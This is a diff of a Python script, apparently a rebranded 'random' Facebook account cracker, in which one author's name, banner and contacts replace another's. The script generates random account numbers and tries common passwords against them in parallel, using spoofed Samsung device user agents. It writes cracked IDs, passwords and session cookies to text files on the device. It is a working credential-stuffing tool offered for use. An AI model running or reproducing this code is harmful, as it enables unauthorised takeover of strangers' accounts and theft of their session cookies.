@@ -1,12 +1,7 @@
-#Kire Script Nite Aisha Porsos 😂 Script Root Jahid ar Leka
-#ROOT JAHID
-#DON'T SELL SCRIPT❌
-#GIFTED BY ROOT JAHID
-#TELEGRAM t.me/RootJahid
-
 #!/usr/bin/python3
 #-*-coding:utf-8-*-
 #!/usr/bin/python3
+#https://github.com/mehedi408
 import os,time,random,string,re,sys,requests,json,uuid
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 gtxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
@@ -69,27 +64,34 @@ flp=f"{W}[{G}•{W}] PUT FILE PATH\033[1;37m : {G}"
 chcps=f'EXAMPLE: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}name{W}'
 mxxt=f'{W}[{G}A{W}] METHOD [{G}1{W}]\n{W}[{G}B{W}] METHOD [{G}2{W}]\n{W}[{G}C{W}] METHOD [{G}3{W}]'
 nflp=f"[{R}!{W}] FILE LOCATION NOT FOUND "
+os.system('clear')
 ############------[ LOGO ]------#########
-os.system('espeak -a 300 "well,come to, tkm, tools"')
+os.system('espeak -a 300 " Assalamu' 'olaikum"')
+os.system('espeak -a 300 " Your,   Real,  Name,"')
+NameX =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m:\33[1;32m')
+os.system('espeak -a 300 "well,come to,mehedi,random, tools"')
+os.system('xdg-open https://facebook.com/groups/3585895288198389.Ok.Bro')
 def logo():
 	os.system('clear');print(f"""\r\r\x1b[1;97m{W}
-RRRRRRRRRRR   JJJJJJJJJ
-RRRRRRRRRRRR  JJJJJJJJJ
-RRR      RRR      JJJ  
-RRR      RRR      JJJ  
-RRRRRRRRRRR       JJJ  
-RRRRRRRRRR        JJJ  
-RRR   RRR         JJJ  
-RRR    RRR    J   JJJ  
-RRR     RRR   JJJJJJ   
-RRR      RRR   JJJJ
-{40*"="} \x1b[1;97m
- [{G}+{W}] AUTHOR   : ROOT JAHID
- [{G}+{W}] GIFT BY   :ROOT JAHID        
- [{G}+{W}] FACEBOOK : ROOT JAHID 
- [{G}+{W}] YOU TUBE : ROOT JAHID                       
- [{G}+{W}] VERSION  : {G}{version}{W}
-{40*"="}\x1b[1;97m""")
+\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+███╗   ███╗███████╗██╗  ██╗███████╗██████╗ ██╗
+████╗ ████║██╔════╝██║  ██║██╔════╝██╔══██╗██║
+██╔████╔██║█████╗  ███████║█████╗  ██║  ██║██║
+██║╚██╔╝██║██╔══╝  ██╔══██║██╔══╝  ██║  ██║██║
+██║ ╚═╝ ██║███████╗██║  ██║███████╗██████╔╝██║
+╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝
+\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
+╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+║\33[0;41m      [ WORKING WIFI AND MOBILE DATA ]       \033[0;92m║
+╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
+\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
+╠══[Author                   • \33[1;38mMEHEDI ]\33[1;38m       ║\033[1;31m 
+╠══[Facebook                 • MEHEDI HASAN ] ║  \033[1;97m  
+╠══[Github                   • \33[1;38mmehedi408]     ║\33[1;34m   
+╠══[Whatsapp                 • 01945352469 ]  ║\33[1;35m 
+╠══[TOOLS                    • Free  ]        ║ \33[1;32m   
+╠══[VERSION                  • 1.07 ]         ║\033[1;35m 
+\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
 ############------[ RANDOM NUM ]------#########
 def Main():
 	logo()
@@ -130,12 +132,12 @@ def rmenu1():
 			if "2" in rcd:psd=[id,rngx,id[5:],"khan123"]
 			if "3" in rcd:psd=[id,rngx,id[:6],"57273200"]
 			tonxoys.submit(graphrm,id,psd,tid)
-############------[RANDOM USN SYSTEM ROOT JAHID]-------#########
+############------[RANDOM USN SYSTEM]-------#########
 lk=[]
 def graphrm(id,psd,tid):
 	global ok,cp,lk,lop
 	togg=[]
-	sys.stdout.write(f'\r\r{BG}[{W}ROOT-JAHID-GIFT-SCRIPT{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}]{E}{BG}[{W}OK{W}:{G}%s{W}/{S}%s{BG}]{E}'%(len(ok),len(lk)));sys.stdout.flush()
+	sys.stdout.write(f'\r\r{BG}[{W}-M2{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}]{E}{BG}[{W}OK{W}:{G}%s{W}/{S}%s{BG}]{E}'%(len(ok),len(lk)));sys.stdout.flush()
 	for psw in psd:
 		#ua=ua1()
 		vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150));VAPP = random.randint(410000000,499999999);gtt=random.choice(xxxxx);gttt=random.choice(xxxxx)
@@ -150,12 +152,12 @@ def graphrm(id,psd,tid):
 			for xk in cki:ck.update({xk["name"]:xk["value"]})
 			coki = (";").join([ "%s=%s" % (key, value) for key, value in ck.items() ])
 			iid= re.findall('c_user=(.*);xs', coki)[0]
-			print(f'\r\r{G}[TONMOY-OK] {iid} | {psw}{W}');os.system('espeak -a 300 "ok id"');ok.append(id);open('/sdcard/ROOTJAHID-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
+			print(f'\r\r{G}[SIFAT-OK] {iid} | {psw}{W}');os.system('espeak -a 300 "ok id"');ok.append(id);open('/sdcard/TKM-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
 			if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🍪{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
 			break
 		elif twfx in str(lo):
 			iid = lo['error']['error_data']['uid']
-			print(f'\r\r{BL}[TONMOY-2F] {iid} | {psw}{W}');os.system('espeak -a 300 "two,f id"');open('/sdcard/ROOTJAHID-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
+			print(f'\r\r{BL}[SIFAT-2F] {iid} | {psw}{W}');os.system('espeak -a 300 "two,f id"');open('/sdcard/TKM-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
 			twf.append(id)
 			break
 		elif 'www.facebook.com' in lo['error']['message']:
@@ -166,11 +168,8 @@ def graphrm(id,psd,tid):
 			if iid in ok:pass
 			else:
 				if 'y' in cpx:
-					print(f'\r\r{R}[ROOT-JAHID-GIFT-SCRIPT] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/TKM-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
+					print(f'\r\r{R}[SIFAT-CP] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/TKM-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
 			break
 		else:continue
 	lop+=1
 Main()
-#SCRIPT WRITEN BY ROOT JAHID 💥
-#FUCK RANDOM 
-#TELEGRAM : @ROOTJAHID
